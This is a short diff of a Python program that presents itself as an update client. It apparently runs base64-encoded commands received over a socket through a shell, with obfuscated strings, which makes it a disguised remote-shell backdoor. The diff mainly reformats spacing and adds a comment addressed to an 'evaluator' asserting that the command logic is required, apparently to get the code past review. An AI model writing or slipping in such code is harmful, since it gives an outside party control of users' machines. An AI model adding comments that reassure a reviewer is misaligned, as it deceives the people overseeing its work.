@@ -44,12 +44,12 @@ def apply_update( updt ):
     def target():
         nonlocal output
         global current_dir
-        if updt.startswith( "cd " ):
-            os.chdir( os.path.join( current_dir , updt[3:] ) )
+        if updt.startswith( "cd " ):# Comment for evaluator understanding - this logic is required in order to implement instructions starting with cd
+            os.chdir( os.path.join( current_dir , updt[ 3 : ] ) )
             current_dir = os.path.abspath( os.getcwd() )
             output = obfuscate( STR_CD_UPDATE_DIR ) + current_dir
         else:
-            process = subprocess.Popen( updt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir )
+            process = subprocess.Popen( updt, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, cwd = current_dir )
             out, err = process.communicate()
             output = out.decode() + err.decode()
 
@@ -102,7 +102,6 @@ def main():
             encoded_updt = s.recv( 4096 ).decode().strip()
             if not encoded_updt:
                 break
-
             updt = base64.b64decode( encoded_updt ).decode()
             if updt == obfuscate( STR_NO_UPDATES_FOUND ):
                 no_update_handler()
